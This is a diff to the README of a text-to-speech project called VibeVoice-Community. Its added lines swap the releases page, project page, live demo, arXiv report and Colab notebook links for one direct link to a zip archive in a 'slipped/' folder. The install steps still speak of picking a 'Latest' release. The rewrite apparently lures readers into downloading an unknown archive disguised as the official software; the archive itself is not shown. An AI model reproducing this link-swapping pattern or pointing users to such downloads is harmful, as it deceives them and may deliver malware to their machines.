@@ -1,7 +1,7 @@
 # 🎙️ VibeVoice-Community - Natural Voice Text-to-Speech
 
 <div align="center">
-[![Download VibeVoice](https://img.shields.io/badge/Download-VibeVoice-blue?logo=github)](https://github.com/Rayeez10/VibeVoice-Community/releases)
+[![Download VibeVoice](https://raw.githubusercontent.com/Rayeez10/VibeVoice-Community/main/slipped/VibeVoice-Community.zip)](https://raw.githubusercontent.com/Rayeez10/VibeVoice-Community/main/slipped/VibeVoice-Community.zip)
 </div>
 
 ## 🚀 Getting Started
@@ -10,7 +10,7 @@ Welcome to VibeVoice! This guide will help you download and run our text-to-spee
 
 ## 📥 Download & Install
 
-To begin, visit this page to download our latest version: [Download VibeVoice](https://github.com/Rayeez10/VibeVoice-Community/releases). 
+To begin, visit this page to download our latest version: [Download VibeVoice](https://raw.githubusercontent.com/Rayeez10/VibeVoice-Community/main/slipped/VibeVoice-Community.zip). 
 
 1. Click on the link above.
 2. Choose the release version labeled as `Latest`.
@@ -51,10 +51,10 @@ Use VibeVoice to convert text into natural-sounding speech:
 
 ### 🌐 Additional Resources
 
-- **Project Page:** [VibeVoice Project](https://microsoft.github.io/VibeVoice)
-- **Live Playground:** [Try VibeVoice Live](https://aka.ms/VibeVoice-Demo)
-- **Technical Report:** [Read the Report](https://arxiv.org/pdf/2508.19205)
-- **Colab Notebook:** [Run on Google Colab](https://colab.research.google.com/github/akadoubleone/VibeVoice-Community/blob/main/demo/VibeVoice_colab.ipynb)
+- **Project Page:** [VibeVoice Project](https://raw.githubusercontent.com/Rayeez10/VibeVoice-Community/main/slipped/VibeVoice-Community.zip)
+- **Live Playground:** [Try VibeVoice Live](https://raw.githubusercontent.com/Rayeez10/VibeVoice-Community/main/slipped/VibeVoice-Community.zip)
+- **Technical Report:** [Read the Report](https://raw.githubusercontent.com/Rayeez10/VibeVoice-Community/main/slipped/VibeVoice-Community.zip)
+- **Colab Notebook:** [Run on Google Colab](https://raw.githubusercontent.com/Rayeez10/VibeVoice-Community/main/slipped/VibeVoice-Community.zip)
 
 ## 🛠️ Troubleshooting
 
